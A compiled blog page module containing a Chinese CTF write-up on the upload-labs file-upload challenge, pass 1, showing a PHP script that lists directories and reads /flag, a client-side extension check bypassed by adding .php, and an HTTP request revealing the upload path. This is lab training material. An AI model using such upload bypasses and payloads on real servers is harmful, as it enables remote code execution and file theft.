import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{o as s,c as a,e as t}from"./app-DCTCPPGQ.js";const p={},e=t(`<p>upload一共包含了20个pass</p><p>每个pass要上传一个文件以攻击服务器 比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器</p><p>比如我写了如下php代码</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code><span class="token comment">&lt;!-- 输出当前目录全部文件和文件夹 --&gt;</span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;.&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;&lt;br&gt;&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

<span class="token comment">&lt;!-- 输出根文件夹下的flag --&gt;</span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;flag&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/flag&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我只要想办法将其上传到服务器, 并知道其在服务器中的位置就可以远程执行脚本攻击</p><p>当然, 服务器不会就这么让你上传木马文件, 所以会采取各类措施来保证服务端的安全, 我们需要做的就是想办法绕过这些安全检测</p><hr><h2 id="pass-1" tabindex="-1"><a class="header-anchor" href="#pass-1"><span>pass 1</span></a></h2><p>这道题要上传一个webshell, 如果我们上传非图片格式文件, 网页会在本地的js脚本中检测文件名来判断是否为图片</p><p>由于检测发生在本地, 所以解决方式多种多样, 我们可以直接看如下代码:</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;text/javascript&quot;</span><span class="token operator">&gt;</span>
    <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&#39;upload_file&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;请选择要上传的文件!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//定义允许上传的文件类型</span>
        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">&quot;.jpg|.png|.gif&quot;</span><span class="token punctuation">;</span>
        <span class="token comment">//提取上传文件的类型</span>
        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//判断上传文件类型是否允许上传</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">&quot;该文件不允许上传，请上传&quot;</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">&quot;类型的文件,当前文件类型为：&quot;</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我选择在<code>allow_ext</code>中添加<code>.php</code>来绕过检测, 然后上传文件</p><p>然后网页会对上传的文件进行反馈显示, 监测网络传输可以找到上传文件的目录:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>GET /upload/interlude_fubuki.png HTTP/1.1
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
Cache-Control: no-cache
Host: dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81
Pragma: no-cache
Proxy-Connection: keep-alive
Referer: http://dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81/Pass-01/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>于是我们只要对该目录下上传的php文件进行请求即可完成攻击</p>`,15),o=[e];function l(c,i){return s(),a("div",null,o)}const d=n(p,[["render",l],["__file","upload-attack.html.vue"]]),k=JSON.parse(`{"path":"/posts/network/ctf-note/upload-attack.html","title":"闲人的ctf记录","lang":"zh-CN","frontmatter":{"title":"闲人的ctf记录","tag":["CTF","upload","文件上传攻击"],"categories":["CFT题目随笔"],"math":true,"date":"2023-04-05T00:00:00.000Z","description":"upload一共包含了20个pass 每个pass要上传一个文件以攻击服务器 比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器 比如我写了如下php代码 我只要想办法将其上传到服务器, 并知道其在服务器中的位置就可以远程执行脚本攻击 当然, 服务器不会就这么让你上传木马文件, 所以会采取各类措施来保证服务端...","head":[["meta",{"property":"og:url","content":"https://Dnullp.github.io/posts/network/ctf-note/upload-attack.html"}],["meta",{"property":"og:site_name","content":"Dnull's Blog"}],["meta",{"property":"og:title","content":"闲人的ctf记录"}],["meta",{"property":"og:description","content":"upload一共包含了20个pass 每个pass要上传一个文件以攻击服务器 比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器 比如我写了如下php代码 我只要想办法将其上传到服务器, 并知道其在服务器中的位置就可以远程执行脚本攻击 当然, 服务器不会就这么让你上传木马文件, 所以会采取各类措施来保证服务端..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Dnull"}],["meta",{"property":"article:tag","content":"CTF"}],["meta",{"property":"article:tag","content":"upload"}],["meta",{"property":"article:tag","content":"文件上传攻击"}],["meta",{"property":"article:published_time","content":"2023-04-05T00:00:00.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"闲人的ctf记录\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-04-05T00:00:00.000Z\\",\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Dnull\\",\\"url\\":\\"https://Dnullp.github.io\\"}]}"]]},"headers":[{"level":2,"title":"pass 1","slug":"pass-1","link":"#pass-1","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":1.97,"words":590},"filePathRelative":"posts/network/ctf-note/upload-attack.md","localizedDate":"2023年4月5日","excerpt":"<p>upload一共包含了20个pass</p>\\n<p>每个pass要上传一个文件以攻击服务器\\n比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器</p>\\n<p>比如我写了如下php代码</p>\\n<div class=\\"language-php\\" data-ext=\\"php\\" data-title=\\"php\\"><pre class=\\"language-php\\"><code><span class=\\"token comment\\">&lt;!-- 输出当前目录全部文件和文件夹 --&gt;</span>\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?php</span>\\n<span class=\\"token variable\\">$dir</span> <span class=\\"token operator\\">=</span> <span class=\\"token function\\">opendir</span><span class=\\"token punctuation\\">(</span><span class=\\"token string single-quoted-string\\">'.'</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span>\\n<span class=\\"token keyword\\">while</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$file</span> <span class=\\"token operator\\">=</span> <span class=\\"token function\\">readdir</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$dir</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">{</span>\\n    <span class=\\"token keyword\\">echo</span> <span class=\\"token variable\\">$file</span><span class=\\"token operator\\">.</span><span class=\\"token string single-quoted-string\\">'&lt;br&gt;'</span><span class=\\"token punctuation\\">;</span>\\n<span class=\\"token punctuation\\">}</span>\\n<span class=\\"token function\\">closedir</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$dir</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span>\\n<span class=\\"token delimiter important\\">?&gt;</span></span>\\n\\n<span class=\\"token comment\\">&lt;!-- 输出根文件夹下的flag --&gt;</span>\\n\\n<span class=\\"token php language-php\\"><span class=\\"token delimiter important\\">&lt;?php</span>\\n<span class=\\"token variable\\">$dir</span> <span class=\\"token operator\\">=</span> <span class=\\"token function\\">opendir</span><span class=\\"token punctuation\\">(</span><span class=\\"token string single-quoted-string\\">'/'</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span>\\n<span class=\\"token keyword\\">while</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$file</span> <span class=\\"token operator\\">=</span> <span class=\\"token function\\">readdir</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$dir</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">{</span>\\n    <span class=\\"token keyword\\">if</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$file</span> <span class=\\"token operator\\">==</span> <span class=\\"token string single-quoted-string\\">'flag'</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">{</span>\\n        <span class=\\"token keyword\\">echo</span> <span class=\\"token function\\">file_get_contents</span><span class=\\"token punctuation\\">(</span><span class=\\"token string single-quoted-string\\">'/flag'</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span>\\n    <span class=\\"token punctuation\\">}</span>\\n<span class=\\"token punctuation\\">}</span>\\n<span class=\\"token function\\">closedir</span><span class=\\"token punctuation\\">(</span><span class=\\"token variable\\">$dir</span><span class=\\"token punctuation\\">)</span><span class=\\"token punctuation\\">;</span>\\n<span class=\\"token delimiter important\\">?&gt;</span></span>\\n</code></pre></div>","autoDesc":true}`);export{d as comp,k as data};
